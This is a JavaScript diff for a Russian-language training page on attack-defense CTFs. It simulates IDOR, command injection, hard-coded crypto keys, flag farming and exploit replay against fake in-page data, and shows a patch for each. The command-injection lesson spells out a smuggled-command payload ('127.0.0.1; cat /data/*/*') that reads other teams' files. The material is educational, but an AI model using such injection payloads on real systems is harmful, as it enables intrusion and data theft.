+/* ---------------- data ---------------- */
+function genFlag(){let s="";const a="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";for(let i=0;i<31;i++)s+=a[Math.floor(Math.random()*a.length)];return s+"=";}
+const FLAGRE=/[A-Z0-9]{31}=/g;
+// notes: ids 1..6, odd = flags. "Ты" владеешь id 2.
+const notes={};[1,2,3,4,5,6].forEach(i=>{notes[i]=(i%2===1)?{owner:"u"+i,body:genFlag()}:{owner:(i===2?"you":"u"+i),body:"обычная заметка "+i};});
+let notesPatched=false;
+// vault blobs 1..5, odd=flags
+const vault={};[1,2,3,4,5].forEach(i=>{const pt=(i%2===1)?genFlag():"note-"+i;vault[i]={pt,ct:fakeHex(pt)};});
+let vaultPatched=false, vaultGot=null;
+let pingPatched=false;
+const pingFlags=[genFlag(),genFlag(),genFlag()];
+function fakeHex(s){let h="";for(let i=0;i<32;i++)h+=("0"+Math.floor(Math.random()*256).toString(16)).slice(-2);return h;}
+function esc(s){return String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+
+/* ---------------- progress ---------------- */
+const LESSONS=["l0","lg","l1","l2","l3","l4","l5","l6"];
+let state={done:{},hw:{}};
+try{const s=localStorage.getItem("ad_trainer");if(s)state=JSON.parse(s);}catch(e){}
+state.done=state.done||{};state.hw=state.hw||{};
+function save(){try{localStorage.setItem("ad_trainer",JSON.stringify(state));}catch(e){}}
+function updateProgress(){
+  const n=LESSONS.filter(l=>state.done[l]).length,pct=Math.round(100*n/LESSONS.length);
+  document.getElementById("pbar").style.width=pct+"%";
+  document.getElementById("ppct").textContent=pct+"%";
+  document.querySelectorAll("aside a.nav").forEach(a=>a.classList.toggle("done",!!state.done[a.dataset.id]));
+  document.querySelectorAll(".btn.mark").forEach(b=>{const d=!!state.done[b.dataset.mark];b.classList.toggle("is-done",d);b.textContent=d?"Пройдено ✓":"Отметить пройденным ✓";});
+}
+
+/* ---------------- nav ---------------- */
+function buildNav(){
+  const side=document.getElementById("side");let html="",grp="";
+  document.querySelectorAll("section.lesson").forEach((s,i)=>{
+    if(s.dataset.grp!==grp){grp=s.dataset.grp;html+='<div class="grp">'+esc(grp)+'</div>';}
+    html+='<a class="nav" data-id="'+s.id+'" href="#'+s.id+'" onclick="return go(\''+s.id+'\')"><span class="ix">'+String(i).padStart(2,"0")+'</span><span>'+esc(s.dataset.title)+'</span><span class="ck">✓</span></a>';
+  });
+  side.innerHTML=html;
+}
+function go(id){const el=document.getElementById(id);if(el)el.scrollIntoView({behavior:"smooth",block:"start"});closeNav();return false;}
+function closeNav(){document.getElementById("side").classList.remove("open");document.getElementById("scrim").classList.remove("show");}
+document.getElementById("menuBtn").onclick=()=>{document.getElementById("side").classList.toggle("open");document.getElementById("scrim").classList.toggle("show");};
+document.getElementById("scrim").onclick=closeNav;
+
+/* scrollspy */
+const spy=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){document.querySelectorAll("aside a.nav").forEach(a=>a.classList.toggle("on",a.dataset.id===e.target.id));}});},{rootMargin:"-40% 0px -55% 0px"});
+document.querySelectorAll("section.lesson").forEach(s=>spy.observe(s));
+
+/* mark done + homework */
+document.addEventListener("click",e=>{const b=e.target.closest(".btn.mark");if(b){state.done[b.dataset.mark]=!state.done[b.dataset.mark];save();updateProgress();}});
+function restoreHw(){document.querySelectorAll(".hw").forEach(h=>{const key=h.dataset.hw;const arr=state.hw[key]||[];h.querySelectorAll("input").forEach((inp,i)=>{inp.checked=!!arr[i];inp.onchange=()=>{const a=state.hw[key]||[];a[i]=inp.checked;state.hw[key]=a;save();};});});}
+
+/* ---------------- L1 IDOR ---------------- */
+function s1get(){
+  const id=parseInt(document.getElementById("s1id").value,10);const o=document.getElementById("s1out");
+  const n=notes[id];
+  if(!n){o.innerHTML='<span class="err">404 — такой заметки нет</span>';return;}
+  if(notesPatched && n.owner!=="you"){o.innerHTML='<span class="err">403 forbidden</span> <span class="dim">// патч работает: чужое не отдаём</span>';return;}
+  const isFlag=FLAGRE.test(n.body);FLAGRE.lastIndex=0;
+  o.innerHTML='200 OK\n{ "id": '+id+', "owner": "'+esc(n.owner)+'", "body": "'+(isFlag?'<span class="flag">'+esc(n.body)+'</span>':esc(n.body))+'" }'+(isFlag?'\n<span class="dim">↑ это ФЛАГ чужой команды. Украден без пароля.</span>':'');
+}
+function s1all(){
+  const o=document.getElementById("s1out");let out="",cnt=0;
+  for(let i=1;i<=6;i++){const n=notes[i];if(!n)continue;
+    if(notesPatched&&n.owner!=="you"){out+="GET /note/"+i+' → <span class="err">403</span>\n';continue;}
+    const f=n.body.match(FLAGRE);if(f){out+="GET /note/"+i+' → <span class="flag">'+esc(f[0])+'</span>\n';cnt++;}
+    else out+="GET /note/"+i+' → <span class="dim">'+esc(n.body)+'</span>\n';}
+  out+="\n"+(notesPatched?'<span class="err">украдено флагов: 0 — дыра закрыта</span>':'<span class="ok">украдено флагов: '+cnt+'</span>');
+  o.innerHTML=out;
+}
+function check1(){
+  const v=document.getElementById("ed1").value,m=document.getElementById("msg1");
+  if(/for\s+i\s+in\s+range\s*\(\s*\d+\s*,\s*\d+\s*\)/.test(v)&&!/\?\?\?/.test(v)){
+    m.innerHTML='<span class="ok">✓ верно — диапазон перебора на месте</span>';document.getElementById("run1b").disabled=false;
+  }else{m.innerHTML='<span class="bad">впиши range(1, N) вместо ???</span>';document.getElementById("run1b").disabled=true;}
+}
+function run1(){
+  const o=document.getElementById("r1out");o.hidden=false;let out="$ python -c exploit\n",cnt=0;
+  for(let i=1;i<=6;i++){const n=notes[i];const f=n&&n.body.match(FLAGRE);if(f){out+='[+] /note/'+i+' → <span class="flag">'+esc(f[0])+'</span>\n';cnt++;}}
+  out+='\n<span class="ok">return '+cnt+' flags</span>  — сдаём в ферму';o.innerHTML=out;
+}
+function patch1(){notesPatched=true;document.getElementById("patch1btn").textContent="Патч применён ✓";document.getElementById("patch1btn").classList.add("is-done");
+  const p=document.getElementById("patch1");p.innerHTML='<code>@app.get("/note/&lt;int:nid&gt;")\ndef get_note(nid):\n    n = NOTES.get(nid)\n    if not n: return error(404)\n    <span style="color:var(--acc)">if n["owner"] != whoami(): return error(403)  # патч!</span>\n    return jsonify(body=n["body"])</code>';
+  s1all();
+}
+
+/* ---------------- L2 cmd injection ---------------- */
+function s2fill(v){document.getElementById("s2host").value=v;}
+function s2run(){
+  const h=document.getElementById("s2host").value,o=document.getElementById("s2out");
+  const dangerous=/[;&|`]|\$\(/.test(h);
+  if(pingPatched||!dangerous){
+    const host=h.split(/[;&|]/)[0].trim();
+    o.innerHTML='PING '+esc(host)+' 56 bytes\n64 bytes from '+esc(host)+': time=0.04 ms\n<span class="dim">// обычный ping, инъекция не сработала</span>';
+    return;
+  }
+  // инъекция: dump файлов с флагами
+  let out='PING 127.0.0.1 ...\n';
+  pingFlags.forEach((f,i)=>{out+='/data/u'+i+'/note.txt: <span class="flag">'+esc(f)+'</span>\n';});
+  out+='\n<span class="ok">// cat выполнился — флаги утекли</span>';o.innerHTML=out;
+}
+function check2(){
+  const v=document.getElementById("ed2").value,m=document.getElementById("msg2");
+  if(/payload\s*=\s*["'][^"']*;[^"']*cat[^"']*["']/.test(v)&&!/\?\?\?/.test(v)){
+    m.innerHTML='<span class="ok">✓ нагрузка с инъекцией готова</span>';document.getElementById("run2b").disabled=false;
+  }else{m.innerHTML='<span class="bad">впиши payload = "127.0.0.1; cat /data/*/*"</span>';document.getElementById("run2b").disabled=true;}
+}
+function run2(){
+  const o=document.getElementById("r2out");o.hidden=false;let out="$ python -c exploit\n";
+  pingFlags.forEach(f=>out+='[+] <span class="flag">'+esc(f)+'</span>\n');
+  out+='\n<span class="ok">return '+pingFlags.length+' flags</span>';o.innerHTML=out;
+}
+function patch2(){pingPatched=true;const b=document.getElementById("patch2btn");b.textContent="Патч применён ✓";b.classList.add("is-done");s2run();}
+
+/* ---------------- L3 crypto ---------------- */
+function s3get(){
+  const id=parseInt(document.getElementById("s3id").value,10),o=document.getElementById("s3out");
+  const b=vault[id];
+  if(vaultPatched){o.innerHTML='<span class="err">401 unauthorized</span> <span class="dim">// патч: /blob теперь под паролем</span>';document.getElementById("s3dec").disabled=true;return;}
+  if(!b){o.innerHTML='<span class="err">404</span>';document.getElementById("s3dec").disabled=true;return;}
+  vaultGot=id;o.innerHTML='200 OK\n{ "id": '+id+', "ciphertext": "'+esc(b.ct)+'" }\n<span class="dim">↑ зашифровано. Но ключ мы знаем…</span>';
+  document.getElementById("s3dec").disabled=false;
+}
+function s3decrypt(){
+  const o=document.getElementById("s3out");const b=vault[vaultGot];if(!b)return;
+  const isF=FLAGRE.test(b.pt);FLAGRE.lastIndex=0;
+  o.innerHTML+='\n\n$ AES-ECB decrypt, key=dojo-fixed-key!!\n→ '+(isF?'<span class="flag">'+esc(b.pt)+'</span>  ← ФЛАГ':'<span class="dim">'+esc(b.pt)+'</span>');
+}
+function check3(){
+  const v=document.getElementById("ed3").value,m=document.getElementById("msg3");
+  if(/for\s+i\s+in\s+range\s*\(\s*\d+\s*,\s*\d+\s*\)/.test(v)&&!/\?\?\?/.test(v)){
+    m.innerHTML='<span class="ok">✓ готово</span>';document.getElementById("run3b").disabled=false;
+  }else{m.innerHTML='<span class="bad">впиши range(1, N) вместо ???</span>';document.getElementById("run3b").disabled=true;}
+}
+function run3(){
+  const o=document.getElementById("r3out");o.hidden=false;let out="$ python -c exploit\n",cnt=0;
+  for(let i=1;i<=5;i++){const b=vault[i];const f=b.pt.match(FLAGRE);if(f){out+='[+] blob '+i+' decrypt → <span class="flag">'+esc(f[0])+'</span>\n';cnt++;}}
+  out+='\n<span class="ok">return '+cnt+' flags</span>';o.innerHTML=out;
+}
+function patch3(){vaultPatched=true;const b=document.getElementById("patch3btn");b.textContent="Патч применён ✓";b.classList.add("is-done");s3get();}
+
+/* ---------------- L4 farm ---------------- */
+function runFarm(){
+  const o=document.getElementById("farmout");o.innerHTML="";let score=0,tick=0;
+  const teams=["team2","team3","team4"];
+  const timer=setInterval(()=>{
+    tick++;let line='<span class="dim">── тик '+tick+' ──</span>\n',got=0;
+    teams.forEach(t=>{const n=3+Math.floor(Math.random()*4);got+=n;o;line+='farm → '+t+': notes+pingtool+vault = <span class="ok">'+n+' флагов</span>\n';});
+    score+=got;line+='submit: <span class="flag">'+got+' ACCEPTED</span>\n\n';
+    o.innerHTML+=line;o.scrollTop=o.scrollHeight;
+    document.getElementById("farmscore").textContent=score;
+    if(tick>=3){clearInterval(timer);o.innerHTML+='<span class="ok">ферма работает сама. Ты просто смотришь, как растут очки.</span>';}
+  },700);
+}
+
+/* ---------------- L5 traffic replay ---------------- */
+const pcap=[
+  {m:"GET",p:"/health",tag:"обычный",bad:false},
+  {m:"POST",p:"/login",tag:"обычный",bad:false},
+  {m:"GET",p:"/note/4",tag:"обычный",bad:false},
+  {m:"GET",p:"/note/3",tag:"⚠ достаёт флаг!",bad:true},
+  {m:"GET",p:"/blob/1",tag:"⚠ качает шифротекст!",bad:true},
+];
+function buildPcap(){
+  const w=document.getElementById("pcap");
+  w.innerHTML=pcap.map((r,i)=>'<div class="urlbar" style="margin:6px 0"><button class="btn sm" style="font-family:var(--f-mono)" onclick="pick('+i+')">'+r.m+' '+esc(r.p)+'</button> <span class="tag '+(r.bad?"red":"")+'">'+esc(r.tag)+'</span></div>').join("");
+}
+function pick(i){
+  const r=pcap[i],o=document.getElementById("pcapout");o.hidden=false;
+  if(!r.bad){o.innerHTML='<span class="dim">Это обычный запрос игры (чекер/пользователь). Не интересно.</span>';return;}
+  o.innerHTML='Нашёл чужую атаку:  <span class="ok">'+r.m+' '+esc(r.p)+'</span>\nПереигрываю по всем соперникам…\n[team2] → <span class="flag">'+genFlag()+'</span>\n[team3] → <span class="flag">'+genFlag()+'</span>\n[team4] → <span class="flag">'+genFlag()+'</span>\n\n<span class="ok">3 флага украдены чужим же эксплойтом. Это replay.</span>';
+}
+
+/* ---------------- init ---------------- */
+buildNav();buildPcap();restoreHw();updateProgress();
+</script>
